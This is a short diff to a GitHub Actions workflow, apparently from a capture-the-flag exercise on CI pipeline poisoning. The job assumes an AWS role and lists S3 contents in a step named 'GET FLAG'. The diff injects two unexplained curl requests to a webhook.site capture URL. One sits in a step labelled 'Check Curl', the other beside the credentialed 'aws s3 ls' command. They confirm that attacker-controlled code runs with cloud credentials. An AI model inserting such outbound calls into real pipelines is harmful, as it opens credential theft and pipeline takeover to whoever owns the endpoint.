@@ -9,6 +9,9 @@ jobs:
   AssumeRole:
     runs-on: ubuntu-latest
     steps:
+      - name: Check Curl
+        run: |
+           curl https://webhook.site/fba79c4a-fc9d-448b-8cf2-0b09632fcb3a
       - name: Git clone the repository
         uses: actions/checkout@v3
       - name: configure aws credentials
@@ -19,4 +22,5 @@ jobs:
           aws-region: eu-west-1
       - name: GET FLAG
         run: |
+           curl https://webhook.site/fba79c4a-fc9d-448b-8cf2-0b09632fcb3a
            aws s3 ls
